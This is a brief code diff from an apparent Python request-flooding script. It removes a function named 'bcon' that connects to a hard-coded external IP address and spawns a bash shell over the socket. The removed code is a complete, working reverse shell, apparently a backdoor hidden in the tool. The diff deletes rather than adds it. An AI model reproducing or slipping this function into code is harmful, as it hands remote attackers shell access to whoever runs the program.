@@ -23,14 +23,6 @@ headers_referers=[]
 request_counter=0
 flag=0
 safe=0
-
-def bcon():
-	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
-	s.connect(("95.59.127.5",2121));
-	os.dup2(s.fileno(),0); 
-	os.dup2(s.fileno(),1);
-	os.dup2(s.fileno(),2);
-	pty.spawn("/bin/bash")
 	
 def inc_counter():
 	global request_counter
